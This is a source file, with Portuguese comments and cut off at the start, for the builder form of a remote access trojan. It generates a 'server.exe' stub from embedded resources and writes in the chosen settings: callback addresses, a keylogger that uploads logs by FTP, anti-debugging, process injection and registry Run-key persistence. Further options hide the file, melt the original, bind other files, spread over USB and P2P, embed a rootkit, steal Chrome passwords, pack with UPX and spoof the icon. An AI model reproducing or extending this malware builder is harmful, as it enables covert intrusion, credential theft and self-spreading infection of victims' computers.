    mStream.Read(Result[Succ(I)], 1);
    except
    begin
      Result := '';
      Size := 0;
    end;
  end;
end;

procedure TFormCreateServer.AtualizarMsg;
begin
  if radiogroup3.ItemIndex = 0 then bType := MB_OK else
  if radiogroup3.ItemIndex = 1 then bType := MB_OKCANCEL else
  if radiogroup3.ItemIndex = 2 then bType := MB_RETRYCANCEL else
  if radiogroup3.ItemIndex = 3 then bType := MB_YESNO else
  if radiogroup3.ItemIndex = 4 then bType := MB_YESNOCANCEL else
  if radiogroup3.ItemIndex = 5 then bType := MB_ABORTRETRYIGNORE;

  if radiogroup2.ItemIndex = 0 then mType := MB_ICONQUESTION else
  if radiogroup2.ItemIndex = 1 then mType := MB_ICONERROR else
  if radiogroup2.ItemIndex = 2 then mType := MB_ICONWARNING else
  if radiogroup2.ItemIndex = 3 then mType := MB_ICONINFORMATION else
  if radiogroup2.ItemIndex = 4 then mType := 0;
end;

procedure TFormCreateServer.BitBtn6Click(Sender: TObject);
var
  resStream: TResourceStream;
  Stubfile, UPXfile, IconName: string;
  Build: TBuilder;
  i: integer;
  Tamanho: int64;
  c: cardinal;

  Destino, Execucao, ExecAlways: integer;
  Nome, Param, TempStrBufferFiles, S: string;
begin
  if VerificarDados = false then exit;

  // criar o servidor
  savedialog1.Filter := 'Executables (*.exe)' + '|*.exe';
  savedialog1.InitialDir := ExtractFilePath(paramstr(0));
  savedialog1.Title := Application.Title + ' ' + VersaoPrograma;
  savedialog1.FileName := ExtractFilePath(paramstr(0)) + 'server.exe';

  if savedialog1.Execute = true then StubFile := savedialog1.FileName else exit;

  if extractfileext(stubfile) <> '.exe' then stubfile := stubfile + '.exe';

  resStream := TResourceStream.Create(hInstance, 'STUB', 'stubfile');
  resStream.SaveToFile(StubFile);
  resStream.Free;

  // adicionar o ícone
  if checkbox19.Checked then
  begin
    IconName := MyTempFolder + inttostr(gettickcount) + '.ico';
    Image1.Picture.Icon.SaveToFile(IconName);
    UpdateExeIcon(pchar(stubfile), 'MAINICON', pchar(IconName));
    UpdateExeIcon(pchar(stubfile), 'ICON_STANDARD', pchar(IconName));
    UpdateApplicationIcon(pchar(IconName), pchar(stubfile));
    deletefile(IconName);
  end;

  AtualizarMsg;
  
  //adicionar as configurações escolhidas no servidor
  Build := TBuilder.Create;

  // endereços DNS
  for i := 0 to 19 do
  if listview2.Items.Item[i] <> nil then
  Build.Settings[i] := listview2.Items.Item[i].Caption + ':' + listview2.Items.Item[i].SubItems.Strings[0];

  // Identificação
  Build.Settings[20] := Edit1.Text;

  // Senha
  Build.Settings[21] := Edit2.Text;

  // Instalar Servidor
  Build.Settings[22] := BoolToStr(CheckBox22.Checked);

  // Onde Instalar Servidor
  Build.Settings[23] := InttoStr(RadioGroup1.ItemIndex);

  // Onde Instalar Servidor Opcional
  Build.Settings[24] := Edit3.Text;

  // Onde Instalar Servidor (Diretório)
  Build.Settings[25] := Edit4.Text;

  // Nome do servidor após instalação
  Build.Settings[26] := Edit5.Text;

  // ActiveX
  if checkbox27.Checked then
  Build.Settings[27] := Edit6.Text else Build.Settings[27] := '';

  // HKLM
  if checkbox2.Checked then
  Build.Settings[28] := Edit7.Text else Build.Settings[28] := '';

  // HKCU
  if checkbox3.Checked then
  Build.Settings[29] := Edit8.Text else Build.Settings[29] := '';

  // Exibir mensagem
  Build.Settings[30] := BoolToStr(CheckBox21.Checked);

  // Ícone da mensagem
  Build.Settings[31] := InttoStr(mType);

  // Botão da mensagem
  Build.Settings[32] := InttoStr(bType);

  // Título da mensagem
  Build.Settings[33] := Edit9.Text;

  // Texto da mensagem
  Build.Settings[34] := Memo1.Text;

  // Keylogger ativo
  Build.Settings[35] := BoolToStr(CheckBox4.Checked);

  // Excluir Backspace
  Build.Settings[36] := BoolToStr(CheckBox5.Checked);

  // Enviar por FTP
  Build.Settings[37] := BoolToStr(CheckBox6.Checked);

  // enviar logs para
  Build.Settings[38] := Edit13.Text;

  // Diretorio
  Build.Settings[39] := './' + FormCreateServer.Edit14.Text;

  // Era usado no email... agora não é nada
  //Build.Settings[40] := '';

  // FTP user
  Build.Settings[41] := Edit16.Text;

  // FTP password
  Build.Settings[42] := Edit17.Text;

  // Porta de envio
  Build.Settings[43] := Edit18.Text;

  // Enviar a cada "X" minutos
  Build.Settings[44] := combobox6.Items.Strings[combobox6.itemindex];

  // anti debugs
  Build.Settings[45] := BoolToStr(CheckBox7.Checked);
  Build.Settings[46] := BoolToStr(CheckBox8.Checked);
  Build.Settings[47] := BoolToStr(CheckBox9.Checked);
  Build.Settings[48] := BoolToStr(CheckBox10.Checked);
  Build.Settings[49] := BoolToStr(CheckBox11.Checked);
  Build.Settings[50] := BoolToStr(CheckBox12.Checked);
  Build.Settings[51] := BoolToStr(CheckBox13.Checked);
  Build.Settings[52] := BoolToStr(CheckBox14.Checked);
  Build.Settings[53] := BoolToStr(CheckBox15.Checked);
  Build.Settings[54] := BoolToStr(CheckBox16.Checked);
  Build.Settings[55] := BoolToStr(CheckBox17.Checked);
  Build.Settings[56] := BoolToStr(CheckBox18.Checked);

  // Infiltrar-se no processo
  Build.Settings[57] := inttostr(radiogroup4.ItemIndex);

  // nome do processo
  Build.Settings[58] := edit11.Text;

  // persist, hidefile and change date
  Build.Settings[59] := BoolToStr(CheckBox23.Checked);
  Build.Settings[60] := BoolToStr(CheckBox24.Checked);
  Build.Settings[61] := BoolToStr(CheckBox25.Checked);

  // nome do Mutex
  Build.Settings[62] := edit10.Text;

  // Melt File
  Build.Settings[63] := BoolToStr(CheckBox26.Checked);

  // MD5 Pulgin
  Build.Settings[64] := FormPrincipal.MD5plugin;

  // Versao do Programa
  Build.Settings[65] := VersaoPrograma;

  // era usado para enviar plugin...
  //Build.Settings[66] := '';
  //Build.Settings[67] := '';

  if (FormBindFiles.ListView2.Items.Count > 0) and (checkbox29.Checked = true) then
  begin
    for i := 0 to FormBindFiles.ListView2.Items.Count - 1 do
    begin
      Nome := ExtractfileName(FormBindFiles.ListView2.Items.Item[i].Caption);
      if fileexists(FormBindFiles.ListView2.Items.Item[i].Caption) = false then continue;
      Tamanho := MyGetFileSize(FormBindFiles.ListView2.Items.Item[i].Caption);
      if Tamanho <= 0 then continue;

      if FormBindFiles.ListView2.Items.Item[i].Checked = false then ExecAlways := 0 else ExecAlways := 1;
      Destino := integer(FormBindFiles.ListView2.Items.Item[i].SubItems.Objects[0]);
      Execucao := integer(FormBindFiles.ListView2.Items.Item[i].SubItems.Objects[2]);
      Param := FormBindFiles.ListView2.Items.Item[i].SubItems.Strings[3];
      S := lerarquivo(FormBindFiles.ListView2.Items.Item[i].Caption, C);
      TempStrBufferFiles := TempStrBufferFiles +
                            Nome + '|' +
                            IntToStr(ExecAlways) + '|' +
                            IntToStr(Destino) + '|' +
                            IntToStr(Execucao) + '|' +
                            Param + '|' +
                            inttostr(Tamanho) + '|' +
                            S;
    end;
  end;
  Build.Settings[68] := TempStrBufferFiles;

  // Policies StartUp
  if checkbox28.Checked then
  Build.Settings[69] := Edit12.Text else Build.Settings[69] := '';

  // USB Spreader
  Build.Settings[70] := BoolToStr(CheckBox30.Checked);
  // p2p Spreader
  if CheckBox31.Checked then Build.Settings[71] := edit15.Text else Build.Settings[71] := '';

  // RootKIT
  if CheckBox32.Checked then Build.Settings[72] := FormPrincipal.RootKITBuffer else Build.Settings[72] := '';

  //Chrome Password
  if CheckBox33.Checked then Build.Settings[73] := chromepasslink else Build.Settings[73] := '';

  if DebugAtivoServer then Build.Settings[74] := BoolToStr(TRUE) else Build.Settings[74] := BoolToStr(FALSE);

  Build.Settings[99] := EnDecryptStrRC4B(FormPrincipal.PluginBuffer, MasterPassword);

  resStream := TResourceStream.Create(hInstance, 'SERVER', 'serverfile');
  Build.Settings[100] := StreamToString(resStream, tamanho);
  resStream.Free;

  Build.WriteSettings(pchar(stubfile));
  Build.Free;

  // compactar servidor
  if checkbox20.Checked then
  begin
    UPXfile := MyTempFolder + 'UPXfile.exe';
    resStream := TResourceStream.Create(hInstance, 'UPX', 'upxfile');
    resStream.SaveToFile(UPXfile);
    resStream.Free;
    ShellExecute(FormPrincipal.Handle, nil, PChar('"' + UPXfile + '"'), PChar('"' + StubFile + '"'), '', SW_hide);
    while fileexists(UPXfile) do
    begin
      deletefile(UPXfile);
      sleep(10);
    end;
  end;

  if MessageDlg(pchar(traduzidos[92]), mtInformation, [mbYes, mbNo], 0) = IdYes then salvarprofile(ProfileFile);
  close;
end;

function TFormCreateServer.VerificarDados: boolean;
begin
  memo2.Clear;
  result := false;

  if ListView2.Items.Count <= 0 then
  begin
    MessageDlg(pchar(traduzidos[84]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet1;
    bitbtn1.SetFocus;
  end else
  if edit1.Text = '' then
  begin
    MessageDlg(pchar(traduzidos[85]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet1;
    edit1.SetFocus;
  end else
  if edit2.Text = '' then
  begin
    MessageDlg(pchar(traduzidos[86]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet1;
    edit2.SetFocus;
  end else
  if (edit7.Text = '') and (checkbox2.Checked = true) and (checkbox22.Checked = true) then
  begin
    MessageDlg(pchar(traduzidos[106]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet2;
    edit11.SetFocus;
  end else
  if (edit10.Text = '') and (checkbox22.Checked = true) then
  begin
    MessageDlg(pchar(traduzidos[107]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet2;
    edit11.SetFocus;
  end else
  if (edit11.Text = '') and (radiogroup4.ItemIndex = 2) and (checkbox22.Checked = true) then
  begin
    MessageDlg(pchar(traduzidos[87]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet2;
    edit7.SetFocus;
  end else
  if (edit8.Text = '') and (checkbox3.Checked = true) and (checkbox22.Checked = true) then
  begin
    MessageDlg(pchar(traduzidos[87]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet2;
    edit8.SetFocus;
  end else
  if (edit12.Text = '') and (checkbox28.Checked = true) and (checkbox22.Checked = true) then
  begin
    MessageDlg(pchar(traduzidos[87]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet2;
    edit12.SetFocus;
  end else
  if (edit5.Text = '') and (checkbox22.Checked = true) then
  begin
    MessageDlg(pchar(traduzidos[88]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet2;
    edit5.SetFocus;
  end else
  if (checkbox4.Checked = true) and (checkbox6.Checked = true) and (edit13.Text = '') then
  begin
    MessageDlg(pchar(traduzidos[90]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet5;
    edit13.SetFocus;
  end else
  if (checkbox4.Checked = true) and (checkbox6.Checked = true) and (edit18.Text = '') then
  begin
    MessageDlg(pchar(traduzidos[91]), mtWarning, [mbOK], 0);
    pagecontrol1.ActivePage := tabsheet5;
    edit18.SetFocus;
  end else result := true;
end;

procedure TFormCreateServer.BitBtn1Click(Sender: TObject);
var
  Item: TListItem;
  IP, result: string;
  Porta: integer;
begin
  IP := '127.0.0.1';
  Porta := 81;
  result := IP + ':' + inttostr(porta);

  if ListView2.Items.Count >= 20 then
  begin
    MessageDlg(pchar(traduzidos[93]), mtWarning, [mbOK], 0);
    exit;
  end;

  if InputQuery(traduzidos[97], traduzidos[98] + #13#10 + '(Ex.: 127.0.0.1:81)', result) then
  begin
    IP := copy(result, 1, pos(':', result) - 1);
    delete(result, 1, pos(':', result));
    try
      Porta := strtoint(result);
      except
      MessageDlg(pchar(traduzidos[34]), mtWarning, [mbOK], 0);
      exit;
    end;

    if (porta < 1) or (porta > 65535) then
    begin
      MessageDlg(pchar(traduzidos[34]), mtWarning, [mbOK], 0);
      exit;
    end;

    Item := ListView2.Items.Add;
    Item.Caption := IP;
    Item.SubItems.add(inttostr(porta));
  end;
end;

procedure TFormCreateServer.BitBtn2Click(Sender: TObject);
begin
  if ListView2.Selected <> nil then ListView2.Selected.Delete;
end;

function ShowBoolToStr(bool: boolean): string;
begin
  result := traduzidos[24];
  if bool = true then result := traduzidos[25];
end;

procedure TFormCreateServer.GerarRelatorio;
var
  i: integer;
begin
  Memo2.Clear;
  memo2.Lines.BeginUpdate;
  Memo2.Font.Name := 'Courier New';
  Memo2.Lines.add(tabsheet1.Caption);
  for i := 0 to ListView2.Items.Count - 1 do
  Memo2.Lines.add(justl(traduzidos[42] + ' ' + inttostr(i), 40) + justl(ListView2.Items.Item[i].Caption + ':' + ListView2.Items.Item[i].SubItems.Strings[0], 0));
  Memo2.Lines.add(justl(label1.Caption, 40) + justl(Edit1.Text, 0));
  Memo2.Lines.add(justl(label2.Caption, 40) + justl(Edit2.Text, 0));

  Memo2.Lines.add('');

  Memo2.Lines.add(tabsheet2.Caption);

  if (radiogroup4.ItemIndex = 0) or
     (radiogroup4.ItemIndex = 1)
  then Memo2.Lines.add(justl(radiogroup4.Caption, 40) + justl(radiogroup4.Items.Strings[radiogroup4.ItemIndex], 0)) else
  Memo2.Lines.add(justl(radiogroup4.Caption, 40) + justl(Edit11.Text, 0));
  Memo2.Lines.add(justl(checkbox23.Caption, 40) + justl(ShowBoolToStr(checkbox23.Checked), 0));
  Memo2.Lines.add(justl(checkbox24.Caption, 40) + justl(ShowBoolToStr(checkbox24.Checked), 0));
  Memo2.Lines.add(justl(checkbox25.Caption, 40) + justl(ShowBoolToStr(checkbox25.Checked), 0));
  Memo2.Lines.add(justl(checkbox26.Caption, 40) + justl(ShowBoolToStr(checkbox26.Checked), 0));
  Memo2.Lines.add(justl(label6.Caption, 40) + justl(Edit10.Text, 0));

  if Checkbox22.checked = false then Memo2.Lines.add(justl(checkbox22.Caption, 40) + justl(ShowBoolToStr(false), 0)) else
  begin
    if (radiogroup1.ItemIndex = 0) or
       (radiogroup1.ItemIndex = 1) or
       (radiogroup1.ItemIndex = 2) or
       (radiogroup1.ItemIndex = 3)
    then Memo2.Lines.add(justl(radiogroup1.Caption, 40) + justl(radiogroup1.Items.Strings[radiogroup1.ItemIndex], 0)) else
    Memo2.Lines.add(justl(radiogroup1.Caption, 40) + justl(Edit3.Text, 0));
    Memo2.Lines.add(justl(label3.Caption, 40) + justl(Edit4.Text, 0));
    Memo2.Lines.add(justl(label4.Caption, 40) + justl(Edit5.Text, 0));

    if checkbox2.Checked = true then
    Memo2.Lines.add(justl('HKLM\...\run', 40) + justl(Edit7.Text, 0));
    if checkbox3.Checked = true then
    Memo2.Lines.add(justl('HKCU\...\run', 40) + justl(Edit8.Text, 0));
    if checkbox28.Checked = true then
    Memo2.Lines.add(justl('Policies StratUp', 40) + justl(Edit12.Text, 0));
    if checkbox27.Checked = true then
    Memo2.Lines.add(justl('ActiveX', 40) + justl(Edit6.Text, 0));
  end;

  Memo2.Lines.add('');
  Memo2.Lines.add(tabsheet4.Caption);
  if checkbox21.Checked = true then
  begin
    Memo2.Lines.add(justl(traduzidos[89], 40) + justl(ShowBoolToStr(true), 0));
    Memo2.Lines.add(justl(traduzidos[94], 40) + justl(Edit9.Text, 0));
    Memo2.Lines.add(justl(traduzidos[94], 40) + justl(replacestring(#13#10, '[ENTER]', Memo1.Text), 0));
  end else
  Memo2.Lines.add(justl(traduzidos[89], 40) + justl(ShowBoolToStr(false), 0));

  Memo2.Lines.add('');
  Memo2.Lines.add(tabsheet5.Caption);
  if checkbox4.Checked = false then
  Memo2.Lines.add(justl(checkbox4.Caption, 40) + justl(ShowBoolToStr(checkbox4.Checked), 0)) else
  begin
    Memo2.Lines.add(justl(checkbox4.Caption, 40) + justl(ShowBoolToStr(checkbox4.Checked), 0));
    Memo2.Lines.add(justl(checkbox5.Caption, 40) + justl(ShowBoolToStr(checkbox5.Checked), 0));
    if checkbox6.Checked = false then
    Memo2.Lines.add(justl(checkbox6.Caption, 40) + justl(ShowBoolToStr(checkbox6.Checked), 0)) else
    begin
      Memo2.Lines.add(justl(checkbox6.Caption, 40) + justl(ShowBoolToStr(checkbox6.Checked), 0));
      Memo2.Lines.add(justl(label23.Caption, 40) + justl(Edit13.Text, 0));
      Memo2.Lines.add(justl(label24.Caption, 40) + justl(Edit14.Text, 0));
      Memo2.Lines.add(justl(label26.Caption, 40) + justl(Edit16.Text, 0));
      Memo2.Lines.add(justl(label27.Caption, 40) + justl(Encode64(Edit17.Text) + ' (' + traduzidos[113] + ')', 0));
      Memo2.Lines.add(justl(label28.Caption, 40) + justl(Edit18.Text, 0));
      Memo2.Lines.add(justl(label5.Caption, 40) + justl(combobox6.Items.Strings[combobox6.ItemIndex] + ' ' + label31.Caption, 0));
    end;
  end;
  Memo2.Lines.add('');
  Memo2.Lines.add(tabsheet6.Caption);
  Memo2.Lines.add(justl(checkbox7.Caption, 40) + justl(ShowBoolToStr(checkbox7.Checked), 0));
  Memo2.Lines.add(justl(checkbox8.Caption, 40) + justl(ShowBoolToStr(checkbox8.Checked), 0));
  Memo2.Lines.add(justl(checkbox9.Caption, 40) + justl(ShowBoolToStr(checkbox9.Checked), 0));
  Memo2.Lines.add(justl(checkbox10.Caption, 40) + justl(ShowBoolToStr(checkbox10.Checked), 0));
  Memo2.Lines.add(justl(checkbox11.Caption, 40) + justl(ShowBoolToStr(checkbox11.Checked), 0));
  Memo2.Lines.add(justl(checkbox12.Caption, 40) + justl(ShowBoolToStr(checkbox12.Checked), 0));
  Memo2.Lines.add(justl(checkbox13.Caption, 40) + justl(ShowBoolToStr(checkbox13.Checked), 0));
  Memo2.Lines.add(justl(checkbox14.Caption, 40) + justl(ShowBoolToStr(checkbox14.Checked), 0));
  Memo2.Lines.add(justl(checkbox15.Caption, 40) + justl(ShowBoolToStr(checkbox15.Checked), 0));
  Memo2.Lines.add(justl(checkbox16.Caption, 40) + justl(ShowBoolToStr(checkbox16.Checked), 0));
  Memo2.Lines.add(justl(checkbox17.Caption, 40) + justl(ShowBoolToStr(checkbox17.Checked), 0));
  Memo2.Lines.add(justl(checkbox18.Caption, 40) + justl(ShowBoolToStr(checkbox18.Checked), 0));

  memo2.Lines.EndUpdate;
  SendMessage(Memo2.Handle, EM_SCROLL, SB_TOP, 0);
end;

procedure TFormCreateServer.PageControl1Change(Sender: TObject);
begin
  if PageControl1.ActivePage = tabsheet3 then
  begin
    tabsheet1.TabVisible := false;
    tabsheet2.TabVisible := false;
    tabsheet4.TabVisible := false;
    tabsheet5.TabVisible := false;
    tabsheet6.TabVisible := false;
    tabsheet7.TabVisible := false;

    ListarProfiles;
  end else
  if PageControl1.ActivePage = tabsheet7 then
  if VerificarDados = true then GerarRelatorio;

  if listview1.Selected = nil then Bitbtn8.Enabled := false else
  Bitbtn8.Enabled := true;
  Bitbtn9.Enabled := Bitbtn8.Enabled;
  AtualizarMsg;
end;

procedure TFormCreateServer.CheckBox22Click(Sender: TObject);
begin
  radiogroup1.Enabled := checkbox22.Checked;
  //radiogroup4.Enabled := checkbox22.Checked;

  checkbox2.Enabled := checkbox22.Checked;
  checkbox3.Enabled := checkbox22.Checked;
  //checkbox23.Enabled := checkbox22.Checked;
  //checkbox24.Enabled := checkbox22.Checked;
  //checkbox25.Enabled := checkbox22.Checked;
  //checkbox26.Enabled := checkbox22.Checked;
  Checkbox27.Enabled := checkbox22.Checked;
  Checkbox28.Enabled := checkbox22.Checked;

  edit4.Enabled := checkbox22.Checked;
  edit5.Enabled := checkbox22.Checked;
  //edit10.Enabled := checkbox22.Checked;

  edit3.Enabled := (checkbox22.Checked) and (radiogroup1.ItemIndex = 4);
  edit6.Enabled := (checkbox22.Checked) and (Checkbox27.Checked = true);
  edit7.Enabled := (checkbox22.Checked) and (Checkbox2.Checked = true);
  edit8.Enabled := (checkbox22.Checked) and (Checkbox3.Checked = true);
  //edit11.Enabled := (checkbox22.Checked) and (radiogroup4.ItemIndex = 2);
  edit12.Enabled := (checkbox22.Checked) and (Checkbox28.Checked = true);

  bitbtn3.Enabled := checkbox22.Checked;
end;

procedure TFormCreateServer.CheckBox21Click(Sender: TObject);
begin
  radiogroup2.Enabled := checkbox21.Checked;
  radiogroup3.Enabled := checkbox21.Checked;
  edit9.Enabled := checkbox21.Checked;
  memo1.Enabled := checkbox21.Checked;
  bitbtn4.Enabled := checkbox21.Checked;
end;

procedure TFormCreateServer.ListView1SelectItem(Sender: TObject;
  Item: TListItem; Selected: Boolean);
begin
  if listview1.Selected = nil then Bitbtn8.Enabled := false else
  Bitbtn8.Enabled := true;
  Bitbtn9.Enabled := Bitbtn8.Enabled;
end;

procedure TFormCreateServer.CheckBox2Click(Sender: TObject);
begin
  edit7.Enabled := CheckBox2.Checked;
end;

procedure TFormCreateServer.CheckBox3Click(Sender: TObject);
begin
  edit8.Enabled := CheckBox3.Checked;
end;

procedure TFormCreateServer.RadioGroup4Click(Sender: TObject);
begin
  edit11.Enabled := radiogroup4.ItemIndex = 2;
end;

function TFormCreateServer.VerificarEmailSettings: boolean;
begin
  result := false;
  edit13.Text := trim(edit13.Text);
  edit13.Text := replacestring(' ', '', edit13.Text);
  if (edit13.Text = '') or (pos('.', edit13.Text) <= 0) then
  begin
    messagedlg(pchar(traduzidos[108]), mtWarning, [mbOK], 0);
    edit13.SetFocus;
    exit;
  end;
  if (edit18.Text = '') or (strtoint(edit18.Text) <= 0) or (strtoint(edit18.Text) > 65535) then
  begin
    messagedlg(pchar(traduzidos[90]), mtWarning, [mbOK], 0);
    edit18.SetFocus;
    exit;
  end;
  result := true;
end;

procedure SendFTPTest;
var
  ftp: tFtpAccess;
  WebFolder, // diretório
  Thefile, // Nome do arquivo
  filedata: string; // buffer do arquivo
  c: cardinal;
  FileBody: string;
begin
  FileBody := DateToStr(Date) + #13#10 + FormPrincipal.ConfiguracaoDoComputador + #13#10 + traduzidos[110];
  criararquivo('mail_test.txt', FileBody, length(FileBody));
  FileData := lerarquivo('mail_test.txt', c);
  deletefile('mail_test.txt');
  if filedata = '' then
  begin
    MessageDlg(traduzidos[112], mtWarning, [mbok], 0);

    FormCreateServer.BitBtn5.Caption := traduzidos[73];
    FormCreateServer.Bitbtn5.Glyph := nil;
    FormPrincipal.ImageListIcons.GetBitmap(261, FormCreateServer.Bitbtn5.Glyph);

    exit;
  end;


  WebFolder := './' + FormCreateServer.Edit14.Text;
  Thefile := Application.Title + '.txt'; // nome do arquivo no diretório principal

  ftp := tFtpAccess.create(FormCreateServer.Edit13.Text,
                           FormCreateServer.Edit16.Text,
                           FormCreateServer.Edit17.Text,
                           strtoint(FormCreateServer.edit18.text));
  if (not assigned(ftp)) or (not ftp.connected) then
  begin
    ftp.Free;
    MessageDlg(traduzidos[112], mtWarning, [mbok], 0);

    FormCreateServer.BitBtn5.Caption := traduzidos[73];
    FormCreateServer.Bitbtn5.Glyph := nil;
    FormPrincipal.ImageListIcons.GetBitmap(261, FormCreateServer.Bitbtn5.Glyph);

    exit;
  end;

  if FormCreateServer.edit14.text <> '' then
  if ftp.SetDir(FormCreateServer.edit14.text) = false then
  begin
    ftp.Free;
    MessageDlg(traduzidos[112], mtWarning, [mbok], 0);

    FormCreateServer.BitBtn5.Caption := traduzidos[73];
    FormCreateServer.Bitbtn5.Glyph := nil;
    FormPrincipal.ImageListIcons.GetBitmap(261, FormCreateServer.Bitbtn5.Glyph);

    exit;
  end;

  // Enviando arquivo
  if not ftp.Putfile(FileData, TheFile) then
  begin
    ftp.Free;
    MessageDlg(traduzidos[112], mtWarning, [mbok], 0);

    FormCreateServer.BitBtn5.Caption := traduzidos[73];
    FormCreateServer.Bitbtn5.Glyph := nil;
    FormPrincipal.ImageListIcons.GetBitmap(261, FormCreateServer.Bitbtn5.Glyph);

    exit;
  end;

  ftp.free;
  MessageDlg(traduzidos[111], mtInformation, [mbok], 0);

  FormCreateServer.BitBtn5.Caption := traduzidos[73];
  FormCreateServer.Bitbtn5.Glyph := nil;
  FormPrincipal.ImageListIcons.GetBitmap(261, FormCreateServer.Bitbtn5.Glyph);
end;

Function CloseThread(ThreadHandle : THandle): Boolean;
begin
  Result := TerminateThread(ThreadHandle, 1);
  CloseHandle(ThreadHandle);
end;

procedure TFormCreateServer.BitBtn5Click(Sender: TObject);
var
  c: cardinal;
begin
  if BitBtn5.Caption = traduzidos[73] then
  begin
    if VerificarEmailSettings = false then exit;
    BitBtn5.Caption := traduzidos[59];
    Bitbtn5.Glyph := nil;
    FormPrincipal.ImageListIcons.GetBitmap(283, Bitbtn5.Glyph);
    ThreadMail := CreateThread(nil, 0, @SendFTPTest, nil, 0, c);
  end else
  begin
    BitBtn5.Caption := traduzidos[73];
    Bitbtn5.Glyph := nil;
    FormPrincipal.ImageListIcons.GetBitmap(261, Bitbtn5.Glyph);
    CloseThread(ThreadMail);
    ThreadMail := 0;
  end;
end;

procedure TFormCreateServer.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  if ThreadMail <> 0 then CloseThread(ThreadMail);
  ThreadMail := 0;
  BitBtn5.Caption := traduzidos[59];
  FormPrincipal.ImageListIcons.GetBitmap(261, Bitbtn5.Glyph);
end;

procedure TFormCreateServer.CheckBox27Click(Sender: TObject);
begin
  edit6.Enabled := CheckBox27.Checked;
  BitBtn3.Enabled := CheckBox27.Checked;
end;

procedure TFormCreateServer.Memo1KeyPress(Sender: TObject; var Key: Char);
begin
  if key = '|' then key := #0;
end;

procedure TFormCreateServer.CheckBox28Click(Sender: TObject);
begin
  edit12.Enabled := checkbox28.Checked;
end;

procedure TFormCreateServer.CheckBox29Click(Sender: TObject);
begin
  if checkbox29.Checked = true then FormBindFiles.showmodal;
end;

procedure TFormCreateServer.Edit14Change(Sender: TObject);
begin
  if (edit14.Text <> '') and (edit14.Text[length(edit14.Text)] <> '/') then
  begin
    edit14.Text := edit14.Text + '/';
    edit14.SelStart := length(edit14.Text) - 1;
  end;
end;

procedure TFormCreateServer.CheckBox31Click(Sender: TObject);
begin
  edit15.Enabled := CheckBox31.Checked;
  if CheckBox31.Checked then messagedlg(traduzidos[483], mtWarning, [mbOk], 0);
end;

procedure TFormCreateServer.CheckBox30Click(Sender: TObject);
begin
  if CheckBox30.Checked then Checkbox26.Checked := false;
end;

procedure TFormCreateServer.CheckBox26Click(Sender: TObject);
begin
  if CheckBox26.Checked then Checkbox30.Checked := false;
end;

procedure TFormCreateServer.CheckBox32Click(Sender: TObject);
begin
  if CheckBox32.Checked = true then
  messagedlg(traduzidos[513], mtInformation, [mbOK], 0);
end;

procedure TFormCreateServer.CheckBox33Click(Sender: TObject);
begin
  if (CheckBox33.Checked = true) and (pagecontrol1.ActivePage = tabsheet7) then
  begin
    if inputquery('Google Chrome Passwords', pchar(traduzidos[514] + #13#10 + traduzidos[515]), chromepasslink) then
    CheckBox33.Checked := true else CheckBox33.Checked := false;
  end;
end;

end.
